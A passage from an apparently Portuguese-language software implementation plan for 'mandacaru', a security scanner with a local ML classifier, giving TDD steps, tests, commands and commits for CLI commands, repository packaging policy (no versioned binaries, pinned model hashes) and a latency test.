                    for i, (b, s, w) in enumerate([("alto", 0.99, True), ("medio", 0.6, False)])))
    assert cmd_ml(ns(tmp_path, mcmd="sombra", arquivo=str(log))) == 0
    out = capsys.readouterr().out
    assert "alto: 1" in out and "medio: 1" in out and "/tmp/0" in out
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_ml_cli.py -q`
Expected: FAIL

- [ ] **Step 3: Implement `add_parser` and `cmd_ml`, and register it in `build_parser`**

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_ml_cli.py -q && .venv/bin/mandacaru ml status && .venv/bin/ruff check .`
Expected: testes passam; `nenhum modelo instalado`

- [ ] **Step 5: Commit**

```bash
git add src/mandacaru/ml/cli.py src/mandacaru/cli.py tests/test_ml_cli.py
git commit -m "ML: comandos ml status, avaliar e sombra"
```

---

### Task 14: Empacotamento e testes de política do repositório

**Files:**
- Modify: `pyproject.toml` (`[tool.setuptools.package-data]`: `mandacaru = ["rules/yara/*.yar", "ml/models/*.json"]`;
  `[tool.pytest.ini_options]` ganha `markers = ["lento: desempenho no hardware real (MANDACARU_LENTO=1)"]`)
- Modify: `.github/workflows/deb.yml` (lista de conferência do conteúdo do pacote ganha
  `dist-packages/mandacaru/ml/model.py`)
- Test: `tests/test_politica.py`

**Interfaces:**
- Consumes: `MODEL_SHA256` (Task 8); `load_model` (Task 5).

- [ ] **Step 1: Write the failing tests**

```python
import hashlib, json, subprocess
from pathlib import Path
from mandacaru.ml import MODEL_SHA256
from mandacaru.ml.model import load_model

ROOT = Path(__file__).resolve().parent.parent
MAGICS = {b"\x7fELF": "ELF", b"PK\x03\x04": "zip", b"7z\xbc\xaf": "7z", b"Rar!": "rar"}

def _versionados():
    out = subprocess.run(["git", "ls-files", "-z"], cwd=ROOT, capture_output=True, check=True).stdout
    return [ROOT / p.decode() for p in out.split(b"\0") if p]

def test_nenhum_binario_ou_compactado_versionado():
    achados = []
    for p in _versionados():
        if p.is_file():
            with open(p, "rb") as fh:
                head = fh.read(4)
            achados += [f"{p.relative_to(ROOT)} ({n})" for m, n in MAGICS.items() if head.startswith(m)]
    assert achados == []

def test_modelos_instalados_batem_com_os_hashes_fixados():
    pasta = ROOT / "src" / "mandacaru" / "ml" / "models"
    presentes = {p.stem: p for p in pasta.glob("*.json")}
    assert set(presentes) == set(MODEL_SHA256)
    for fam, p in presentes.items():
        load_model(p, expected_sha256=MODEL_SHA256[fam])
        for s in _strings(json.loads(p.read_text())):
            assert len(s) <= 64                 # nada que pareca conteudo codificado

def _strings(o):
    if isinstance(o, str):
        yield o
    elif isinstance(o, dict):
        for k, v in o.items():
            yield k
            yield from _strings(v)
    elif isinstance(o, list):
        for v in o:
            yield from _strings(v)

def test_modelos_vao_no_pacote():
    assert '"ml/models/*.json"' in (ROOT / "pyproject.toml").read_text()
```

(O teste chama `git` através de `subprocess`, só leitura, dentro do repositório. A proibição de `subprocess` vale
para `tools/treino/`, no Plano 2.)

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_politica.py -q`
Expected: FAIL em `test_modelos_vao_no_pacote`

- [ ] **Step 3: Edit `pyproject.toml` and `deb.yml`**

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_politica.py -q && .venv/bin/ruff check .`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add pyproject.toml .github/workflows/deb.yml tests/test_politica.py
git commit -m "ML: modelos como package data e politica do repositorio (sem binario/zip versionado)"
```

---

### Task 15: Desempenho no SUPRA e documentação

**Files:**
- Create: `tests/test_ml_desempenho.py`
- Modify: `README.md` (seção nova "Classificador de IA (em preparação)" depois de "Telemetria (opt-in)")
- Modify: `CHANGELOG.md` (seção `## 0.6.0 (em desenvolvimento)` no topo)

**Interfaces:**
- Consumes: `extract`, `detect_kind`, `Classifier`; `tests/ml_model.py`.

- [ ] **Step 1: Write the performance test (opt-in)**

```python
import os, statistics, time
from pathlib import Path
import pytest
from mandacaru.ml.features import extract
from mandacaru.ml.kind import detect_kind

pytestmark = [pytest.mark.lento,
              pytest.mark.skipif(os.environ.get("MANDACARU_LENTO") != "1", reason="defina MANDACARU_LENTO=1")]

def test_latencia_da_extracao_em_programas_reais():
    tempos = []
    for p in sorted(Path("/usr/bin").iterdir())[:600]:
        if not p.is_file() or p.is_symlink():
            continue
        data = p.read_bytes()[: 8 * 1024 * 1024 - 1]
        kind = detect_kind(data)
        if kind is None:
            continue
        t = time.perf_counter(); extract(kind, data); tempos.append(time.perf_counter() - t)
    assert len(tempos) >= 100
    tempos.sort()
    assert statistics.median(tempos) <= 0.030 and tempos[int(len(tempos) * 0.99)] <= 0.150
```

- [ ] **Step 2: Run on the SUPRA**

Run: `MANDACARU_LENTO=1 .venv/bin/python -m pytest tests/test_ml_desempenho.py -q`
Expected: PASS. Se falhar, otimize o extrator (Tasks 3–4) até passar; não afrouxe os limites.

- [ ] **Step 3: Document**

- README: o que é o classificador, que ainda não vem com modelo (o Plano 2 produz), os modos da seção `[ml]`, o
  comando `mandacaru ml status` e a garantia de que o modelo nunca libera nada.
- CHANGELOG `0.6.0 (em desenvolvimento)`: classificador local (motor, decisão, modos, CLI), ainda sem modelo
  instalado.

- [ ] **Step 4: Full verification**

Run: `.venv/bin/python -m pytest -q && .venv/bin/ruff check . && .venv/bin/mandacaru ml status`
Expected: suíte inteira passa (o teste lento fica `skipped`); `nenhum modelo instalado`

- [ ] **Step 5: Commit**

```bash
git add tests/test_ml_desempenho.py README.md CHANGELOG.md
git commit -m "ML: teste de desempenho no hardware real e documentacao do classificador"
```
